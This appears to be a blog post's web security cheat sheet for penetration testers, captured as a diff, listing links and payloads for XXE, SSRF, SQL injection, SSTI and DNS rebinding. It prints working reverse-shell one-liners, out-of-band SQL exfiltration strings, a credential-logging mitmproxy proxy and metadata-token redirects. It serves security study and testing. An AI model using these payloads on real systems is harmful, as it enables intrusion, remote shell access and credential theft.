+<br># XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application&rsquo;s processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
+<br><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code>
+<br><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;</code>
+<br><code>&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;</code></p>
+<p><a href="https://phonexicum.github.io/infosec/xxe.html">https://phonexicum.github.io/infosec/xxe.html</a>
+<br># Information Security PENTEST XXE
+<br><code>&lt;!DOCTYPE foo SYSTEM &quot;http://xpto.burpcollaborator.net/xpto.dtd&quot;&gt;</code></p>
+<p><a href="https://github.com/GoSecure/dtd-finder">https://github.com/GoSecure/dtd-finder</a>
+<br># Identify DTDs on filesystem snapshot and build XXE payloads using those local DTDs.</p>
+<p><br># SSRF
+<br><a href="https://www.blackhat.com/us-17/briefings.html#a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages">https://www.blackhat.com/us-17/briefings.html#a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages</a>
+<br># We propose a new exploit technique that brings a whole-new attack surface to bypass SSRF (Server Side Request Forgery) protections.
+<br><code>http://1.1.1.1&amp;@2.2.2.2#@3.3.3.3/</code>
+<br><code>http://127.0.0.1:11211:80/</code>
+<br><code>http://google.com#@evil.com/</code>
+<br><code>http://foo@evil.com:80@google.com/</code>
+<br><code>http://foo@evil.com:80 @google.com/</code>
+<br><code>http://127.0.0.1\tfoo.google.com/</code>
+<br><code>http://127.0.0.1%09foo.google.com/</code>
+<br><code>http://127.0.0.1%2509foo.google.com/</code>
+<br><code>http://127.0.0.1:11211#@google.com:80/</code>
+<br><code>http://foo@127.0.0.1:11211@google.com:80/</code>
+<br><code>http://foo@127.0.0.1 @google.com:11211/</code></p>
+<h3 id="bypass">Bypass</h3>
+<p><a href="https://blog.ryanjarv.sh/2022/03/16/bypassing-wafs-with-alternate-domain-routing.html">https://blog.ryanjarv.sh/2022/03/16/bypassing-wafs-with-alternate-domain-routing.html</a>
+<br># Bypassing CDN WAF’s with Alternate Domain Routing</p>
+<h3 id="deserialization">Deserialization</h3>
+<p><a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a>
+<br># JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc.</p>
+<p><a href="https://github.com/pimps/JNDI-Exploit-Kit">https://github.com/pimps/JNDI-Exploit-Kit</a>
+<br># This is a forked modified version of the great exploitation tool created by @welk1n (<a href="https://github.com/welk1n/JNDI-Injection-Exploit)">https://github.com/welk1n/JNDI-Injection-Exploit)</a>.</p>
+<h3 id="a-namessrfassrf-server-side-request-forgery"><a name="SSRF"></a>SSRF (Server-Side Request Forgery)</h3>
+<p><a href="https://lab.wallarm.com/blind-ssrf-exploitation/">https://lab.wallarm.com/blind-ssrf-exploitation/</a>
+<br># There is such a thing as SSRF. There’s lots of information about it, but here is my quick summary.</p>
+<p><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/">https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/</a>
+<br># A Glossary of Blind SSRF Chains.</p>
+<p><a href="https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/">https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/</a>
+<br># BRING YOUR OWN SSRF – THE GATEWAY ACTUATOR.</p>
+<p><a href="https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/">https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/</a>
+<br># Attacking Java RMI via SSRF.</p>
+<h3 id="dns-rebinding">DNS Rebinding</h3>
+<p><a href="http://rebind.it">http://rebind.it</a>
+<br># Singularity of Origin is a tool to perform DNS rebinding attacks. It includes the necessary components to rebind the IP address of the attack server DNS name to the target machine&rsquo;s IP address and to serve attack payloads to exploit vulnerable software on the target machine.</p>
+<p><a href="https://github.com/brannondorsey/dns-rebind-toolkit">https://github.com/brannondorsey/dns-rebind-toolkit</a>
+<br># DNS Rebind Toolkit is a frontend JavaScript framework for developing DNS Rebinding exploits against vulnerable hosts and services on a local area network (LAN).</p>
+<p><a href="https://github.com/brannondorsey/whonow">https://github.com/brannondorsey/whonow</a>
+<br># A malicious DNS server for executing DNS Rebinding attacks on the fly.</p>
+<p><a href="https://nip.io">https://nip.io</a>
+<br># Dead simple wildcard DNS for any IP Address</p>
+<p><a href="https://sslip.io">https://sslip.io</a>
+<br># sslip.io is a DNS (Domain Name System) service that, when queried with a hostname with an embedded IP address, returns that IP Address.</p>
+<p><a href="http://1u.ms/">http://1u.ms/</a>
+<br># This is a small set of zero-configuration DNS utilities for assisting in detection and exploitation of SSRF-related vulnerabilities. It provides easy to use DNS rebinding utility, as well as a way to get resolvable resource records with any given contents.</p>
+<h3 id="smtp-header-injection">SMTP Header Injection</h3>
+<p><a href="https://www.acunetix.com/blog/articles/email-header-injection/">https://www.acunetix.com/blog/articles/email-header-injection/</a>
+<br># It is common practice for web pages and web applications to implement contact forms, which in turn send email messages to the intended recipients. Most of the time, such contact forms set headers. These headers are interpreted by the email library on the web server and turned into resulting SMTP commands, which are then processed by the SMTP server.
+<br><code>POST /contact.php HTTP/1.1</code>
+<br><code>Host: www.example2.com</code>
+<br><code> </code>
+<br><code>name=Best Product\nbcc: everyone@example3.com&amp;replyTo=blame_anna@example.com&amp;message=Buy my product!</code></p>
+<h3 id="reverse-shell">Reverse Shell</h3>
+<p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>
+<br># If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you’ll probably want an interactive shell.
+<br># Bash
+<br><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></p>
+<p><br># PERL
+<br><code>perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'</code></p>
+<p><br># Python
+<br><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p>
+<p><br># PHP
+<br><code>php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code></p>
+<p><br># Ruby
+<br><code>ruby -rsocket -e'f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'</code></p>
+<p><br># Netcat
+<br><code>nc -e /bin/sh 10.0.0.1 1234</code>
+<br><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</code></p>
+<p><br># Java
+<br><code>r = Runtime.getRuntime()</code>
+<br><code>p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</code>
+<br><code>p.waitFor()</code></p>
+<p><br># xterm
+<br><code>xterm -display 10.0.0.1:1</code>
+<br><code>Xnest :1</code>
+<br><code>xhost +targetip</code></p>
+<p><a href="https://reverse-shell.sh/">https://reverse-shell.sh/</a>
+<br># Reverse Shell as a Service
+<br><code>nc -l 1337</code>
+<br><code>curl https://reverse-shell.sh/yourip:1337 | sh</code></p>
+<p><a href="https://github.com/calebstewart/pwncat">https://github.com/calebstewart/pwncat</a>
+<br># pwncat is a post-exploitation platform for Linux targets.</p>
+<h3 id="a-namesqli-manualasqli-sql-injection"><a name="SQLi-Manual"></a>SQLi (SQL Injection)</h3>
+<p><a href="https://arxiv.org/abs/1303.3047">https://arxiv.org/abs/1303.3047</a>
+<br># This paper describes an advanced SQL injection technique where DNS resolution process is exploited for retrieval of malicious SQL query results.</p>
+<p><br># Oracle
+<br><code>'||(SELECT%20UTL_INADDR.GET_HOST_ADDRESS('xpto.example.com'))||'</code>
+<br><code>'||(SELECT%20UTL_HTTP.REQUEST('http://xpto.example.com')%20FROM%20DUAL)||'</code>
+<br><code>'||(SELECT%20HTTPURITYPE('http://xpto.example.com').GETCLOB()%20FROM%20DUAL)||'</code>
+<br><code>'||(SELECT%20DBMS_LDAP.INIT(('xpto.example.com',80)%20FROM%20DUAL)||'</code></p>
+<p><br># MySQL
+<br><code>'||(SELECT%20LOAD_FILE('\\xpto.example.com'))||'</code></p>
+<p><br># Microsoft SQL Server
+<br><code>'+;EXEC('master..xp_dirtree&quot;\\xpto.example.com\&quot;');+'</code>
+<br><code>'+;EXEC('master..xp_fileexist&quot;\\xpto.example.com\&quot;');+'</code>
+<br><code>'+;EXEC('master..xp_subdirs&quot;\\xpto.example.com\&quot;');+'</code></p>
+<p><br># PostgreSQL
+<br><code>'||;COPY%20users(names)%20FROM%20'\\xpto.example.com\';||'</code></p>
+<p><a href="https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet">https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet</a>
+<br># This repository contains a advanced methodology of all types of SQL Injection.</p>
+<h3 id="a-nameldi-manualalfi-local-file-inclusion"><a name="LDI-Manual"></a>LFI (Local File Inclusion)</h3>
+<p><a href="https://bierbaumer.net/security/php-lfi-with-nginx-assistance/">https://bierbaumer.net/security/php-lfi-with-nginx-assistance/</a>
+<br># This post presents a new method to exploit local file inclusion (LFI) vulnerabilities in utmost generality, assuming only that PHP is running in combination with Nginx under a common standard configuration.</p>
+<h3 id="a-namesstiassti-server-side-template-injection"><a name="SSTI"></a>SSTI (Server Side Template Injection)</h3>
+<p><a href="https://www.youtube.com/watch?v=SN6EVIG4c-0">https://www.youtube.com/watch?v=SN6EVIG4c-0</a>
+<br># Template Injections (SSTI) in 10 minutes</p>
+<p><a href="https://portswigger.net/research/server-side-template-injection">https://portswigger.net/research/server-side-template-injection</a>
+<br># Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection, a frequently critical vulnerability that is extremely easy to mistake for Cross-Site Scripting (XSS), or miss entirely. Unlike XSS, Template Injection can be used to directly attack web servers&rsquo; internals and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point.</p>
+<p><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a>
+<br># Tplmap assists the exploitation of Code Injection and Server-Side Template Injection vulnerabilities with a number of sandbox escape techniques to get access to the underlying operating system.
+<br><code>tplmap.py --os-shell -u 'http://www.example.com/page?name=John'</code></p>
+<h3 id="a-namewebdavawebdav-web-distributed-authoring-and-versioning"><a name="WebDAV"></a>WebDAV (Web Distributed Authoring and Versioning)</h3>
+<p><a href="http://www.webdav.org/cadaver/">http://www.webdav.org/cadaver/</a>
+<br># cadaver is a command-line WebDAV client for Unix.</p>
+<p><a href="https://github.com/cldrn/davtest">https://github.com/cldrn/davtest</a>
+<br># This program attempts to exploit WebDAV enabled servers.</p>
+<h3 id="generic-tools">Generic Tools</h3>
+<p><a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a>
+<br># The Cyber Swiss Army Knife</p>
+<p><a href="https://packettotal.com/">https://packettotal.com/</a>
+<br># Pcap analysis and samples</p>
+<h2 id="a-namegeneral-allageneral"><a name="General-All"></a>General</h2>
+<p><br># Print only response headers for any method with curl
+<br><code>curl -skSL -D - https://www.example.com -o /dev/null</code></p>
+<p><br># Pure bash multhread script</p>
+<pre><code>#!/bin/bash
+
+FILE=&quot;${1}&quot;
+THREADS=&quot;${2}&quot;
+TIMEOUT=&quot;${3}&quot;
+CMD=&quot;${4}&quot;
+NUM=$(wc -l ${FILE} | awk '{ print $1 }')
+THREAD=0
+NUMDOM=0
+while read SUBDOMAIN; do
+        PIDSTAT=0
+        if [ $THREAD -lt $THREADS ]; then
+                eval timeout ${TIMEOUT} ${CMD} 2&gt;/dev/null &amp;
+                PIDS[$THREAD]=&quot;${!}&quot;
+                let THREAD++
+                let NUMDOM++
+                echo -ne &quot;\r&gt;Progress: ${NUMDOM} of ${NUM} ($(awk &quot;BEGIN {printf \&quot;%0.2f\&quot;,(${NUMDOM}*100)/${NUM}}&quot;)%)\r&quot;
+        else
+                while [ ${PIDSTAT} -eq 0 ]; do
+                        for j in &quot;${!PIDS[@]}&quot;; do
+                                kill -0 &quot;${PIDS[j]}&quot; &gt; /dev/null 2&gt;&amp;1
+                                PIDSTAT=&quot;${?}&quot;
+                                if [ ${PIDSTAT} -ne 0 ]; then
+                                        eval timeout ${TIMEOUT} ${CMD} 2&gt;/dev/null &amp;
+                                        PIDS[j]=&quot;${!}&quot;
+                                        let NUMDOM++
+                                        echo -ne &quot;\r&gt;Progress: ${NUMDOM} of ${NUM} ($(awk &quot;BEGIN {printf \&quot;%0.2f\&quot;,(${NUMDOM}*100)/${NUM}}&quot;)%)\r&quot;
+                                        break
+                                fi
+                        done
+                done
+        fi
+done &lt; ${FILE}
+wait
+</code></pre><p><br># Reverse Proxy
+<br><code>mitmdump --certs ~/cert/cert.pem --listen-port 443 --scripts script.py --set block_global=false --mode reverse:https://example.com/</code> # Good for capture credentials</p>
+<pre><code>$ cat script.py
+import mitmproxy.http
+from mitmproxy import ctx
+
+def request(flow):
+    if flow.request.method == &quot;POST&quot;:
+        ctx.log.info(flow.request.get_text())
+</code></pre><p><br># SOCKS Proxy
+<br><code>ssh -N -D 0.0.0.0:1337 localhost</code></p>
+<p><br># Fake HTTP Server
+<br><code>while true ; do echo -e &quot;HTTP/1.1 200 OK\nContent-Length: 0\n\n&quot; | nc -vl 1.2.3.4 80; done</code>
+<br><code>socat -v -d -d TCP-LISTEN:80,crlf,reuseaddr,fork 'SYSTEM:/bin/echo &quot;HTTP/1.1 200 OK&quot;;/bin/echo &quot;Content-Length: 2&quot;;/bin/echo;/bin/echo &quot;OK&quot;'</code>
+<br><code>socat -v -d -d TCP-LISTEN:80,crlf,reuseaddr,fork 'SYSTEM:/bin/echo &quot;HTTP/1.1 302 Found&quot;;/bin/echo &quot;Content-Length: 0&quot;;/bin/echo &quot;Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token&quot;;/bin/echo;/bin/echo'</code>
+<br><code>FILE=image.jpg;socat -v -d -d TCP-LISTEN:80,fork &quot;SYSTEM:/bin/echo 'HTTP/1.1 200 OK';/bin/echo 'Content-Length: '`wc -c&lt;$FILE`;/bin/echo 'Content-Type: image/png';/bin/echo;dd 2&gt;/dev/null&lt;$FILE&quot;</code> # Present an image
+<br><code>python2 -m SimpleHTTPServer 8080</code>
+<br><code>python3 -m http.server 8080</code>
+<br><code>php -S 0.0.0.0:80</code>
+<br><code>ruby -run -e httpd . -p 80</code>
+<br><code>busybox httpd -f -p 80</code></p>
+<p><br># Fake HTTPS Server
+<br><code>openssl req -new -x509 -keyout test.key -out test.crt -nodes</code>
+<br><code>cat test.key test.crt &gt; test.pem</code>
+<br><code>socat -v -d -d openssl-listen:443,crlf,reuseaddr,cert=test.pem,verify=0,fork 'SYSTEM:/bin/echo &quot;HTTP/1.1 200 OK&quot;;/bin/echo &quot;Content-Length: 2&quot;;/bin/echo;/bin/echo &quot;OK&quot;'</code>
+<br><code>socat -v -d -d openssl-listen:443,crlf,reuseaddr,cert=web.pem,verify=0,fork 'SYSTEM:/bin/echo &quot;HTTP/1.1 302 Found&quot;;/bin/echo &quot;Content-Length: 0&quot;;/bin/echo &quot;Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token&quot;;/bin/echo;/bin/echo'</code>
+<br><code>stunnel stunnel.conf</code> # Check <a href="https://www.stunnel.org/">https://www.stunnel.org/</a></p>
+<p><br># Python 3 Simple HTTPS Server</p>
+<pre><code>    import http.server, ssl
+    server_address = ('0.0.0.0', 443)
+    httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
+    httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='/path/cert.pem', ssl_version=ssl.PROTOCOL_TLS)
+    httpd.serve_forever()
+</code></pre><p><br># Fake FTP Server
+<br><code>python -m pyftpdlib --directory=/tmp/dir/ --port=21</code></p>
+<p><br># Check HTTP or HTTPS
+<br><code>while read i; do curl -m 15 -ki http://$i &amp;&gt; /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done &lt; subdomains.txt</code>
+<br><code>while read i; do curl -m 15 -ki https://$i &amp;&gt; /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done &lt; subdomains.txt</code></p>
+<p><br># Ten requests in parallel
+<br><code>xargs -I % -P 10 curl -H 'Connection: close' -s -D - -o /dev/null https://example.com &lt; &lt;(printf '%s\n' {1..10000})</code></p>
+<p><br># Access target directly through IP address
+<br><code>http://1.2.3.4</code>
+<br><code>https://1.2.3.4</code></p>
+<p><br># Trim space and newlines on bash variable
+<br><code>&quot;${i//[$'\t\r\n ']}&quot;</code></p>
+<p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>
+<br># GTFOBins is a curated list of Unix binaries that can used to bypass local security restrictions in misconfigured systems.</p>
+<p><a href="https://www.guyrutenberg.com/2014/05/02/make-offline-mirror-of-a-site-using-wget/">https://www.guyrutenberg.com/2014/05/02/make-offline-mirror-of-a-site-using-wget/</a>
+<br># Make Offline Mirror of a Site using wget
+<br><code>wget -mkEpnp https://www.example.com/</code></p>
+<p><br># Referer spoofing
+<br><code>&lt;base href=&quot;https://www.google.com/&quot;&gt;</code>
+<br><code>&lt;style&gt;</code>
+<br><code>@import 'https://CSRF.vulnerable.example/';</code>
+<br><code>&lt;/style&gt;</code></p>
+<p><a href="https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html">https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html</a>
+<br># Check PreAuth RCE on Palo Alto GlobalProtect
+<br><code>time curl -s -d 'scep-profile-name=%9999999c' https://${HOST}/sslmgr &gt;/dev/null</code>
+<br><code>time curl -s -d 'scep-profile-name=%99999999c' https://${HOST}/sslmgr &gt;/dev/null</code>
+<br><code>time curl -s -d 'scep-profile-name=%999999999c' https://${HOST}/sslmgr &gt;/dev/null</code></p>
+<p><a href="https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html">https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html</a>
+<br># How I Chained 4 Bugs(Features?) into RCE on Amazon Collaboration System (bypass with /..;/)</p>
+<p><a href="https://docs.google.com/presentation/d/1jqnpPe0A7L_cVuPe1V0XeW6LOHvMYg5PBqHd96SScJ8/">https://docs.google.com/presentation/d/1jqnpPe0A7L_cVuPe1V0XeW6LOHvMYg5PBqHd96SScJ8/</a>
+<br># Routing To Another Backend , Deserve Spending Hours AND Hours On Its So Inspired By @samwcyo&rsquo;s Talk &quot; Attacking Secondary Contexts in Web Applications &quot; , I Have Been Collecting A Lot Of Stuff To PWN This Backend.</p>
+<p><a href="https://medium.com/@ricardoiramar/reusing-cookies-23ed4691122b">https://medium.com/@ricardoiramar/reusing-cookies-23ed4691122b</a>
+<br># This is a story how I accidentally found a common vulnerability across similar web applications just by reusing cookies on different subdomains from the same web application.</p>
+<p><a href="https://github.com/shieldfy/API-Security-Checklist">https://github.com/shieldfy/API-Security-Checklist</a>
+<br># Checklist of the most important security countermeasures when designing, testing, and releasing your API.</p>
+<p><a href="https://ippsec.rocks">https://ippsec.rocks</a>
+<br># Looking for a video on a specific hacking technique/tool? Searches over 100 hours of my videos to find you the exact spot in the video you are looking for.</p>
+              
+
+
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://thieu1995.github.io/tags/learning-path/">learning path</a>
+
+  <a class="tag tag--primary tag--small" href="https://thieu1995.github.io/tags/computer-science/">computer science</a>
+
+  <a class="tag tag--primary tag--small" href="https://thieu1995.github.io/tags/web-security/">web security</a>
+
+  <a class="tag tag--primary tag--small" href="https://thieu1995.github.io/tags/it/">IT</a>
+
+                  </div>
+                
+              
+            
+            
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://thieu1995.github.io/2021/03/cheat-sheet-for-time-series-forecasting/" data-tooltip="Cheat Sheet for Time Series Forecasting" aria-label="NEXT: Cheat Sheet for Time Series Forecasting">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://thieu1995.github.io/2021/03/path-for-self-taught-education-in-computer-science/" data-tooltip="Path for self-taught education in Computer Science" aria-label="PREVIOUS: Path for self-taught education in Computer Science">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://thieu1995.github.io/2021/03/cheat-sheet-for-web-security/" title="Share on Facebook" aria-label="Share on Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://thieu1995.github.io/2021/03/cheat-sheet-for-web-security/" title="Share on Twitter" aria-label="Share on Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://thieu1995.github.io/2021/03/cheat-sheet-for-web-security/" title="Share on Linkedin" aria-label="Share on Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="Leave a comment">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="Back to top">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+            
+  
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https:\/\/thieu1995.github.io\/2021\/03\/cheat-sheet-for-web-security\/';
+        
+          this.page.identifier = '\/2021\/03\/cheat-sheet-for-web-security\/'
+        
+      };
+      (function() {
+        
+        
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+          return;
+        }
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = 'https-thieu1995-github-io';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+  
+
+
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2022 Nguyen Van Thieu. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://thieu1995.github.io/2021/03/cheat-sheet-for-time-series-forecasting/" data-tooltip="Cheat Sheet for Time Series Forecasting" aria-label="NEXT: Cheat Sheet for Time Series Forecasting">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://thieu1995.github.io/2021/03/path-for-self-taught-education-in-computer-science/" data-tooltip="Path for self-taught education in Computer Science" aria-label="PREVIOUS: Path for self-taught education in Computer Science">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://thieu1995.github.io/2021/03/cheat-sheet-for-web-security/" title="Share on Facebook" aria-label="Share on Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://thieu1995.github.io/2021/03/cheat-sheet-for-web-security/" title="Share on Twitter" aria-label="Share on Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://thieu1995.github.io/2021/03/cheat-sheet-for-web-security/" title="Share on Linkedin" aria-label="Share on Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="Leave a comment">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="Back to top">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+      </div>
+      
+<div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-times"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fthieu1995.github.io%2F2021%2F03%2Fcheat-sheet-for-web-security%2F" aria-label="Share on Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i><span>Share on Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fthieu1995.github.io%2F2021%2F03%2Fcheat-sheet-for-web-security%2F" aria-label="Share on Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fthieu1995.github.io%2F2021%2F03%2Fcheat-sheet-for-web-security%2F" aria-label="Share on Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i><span>Share on Linkedin</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+
+
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-times"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://www.gravatar.com/avatar/435730f573f686aa570b7607ed361ded?s=110" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Nguyen Van Thieu</h4>
+    
+      <div id="about-card-bio">Lecturer at Faculty of Computer Science, Phenikaa University</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Lecturer, Researcher, Programmer, Gamer
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker-alt"></i>
+        <br/>
+        Vietnam
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://thieu1995.github.io/img/side-banner.jpg');"></div>
+    
+  
+
+
+    
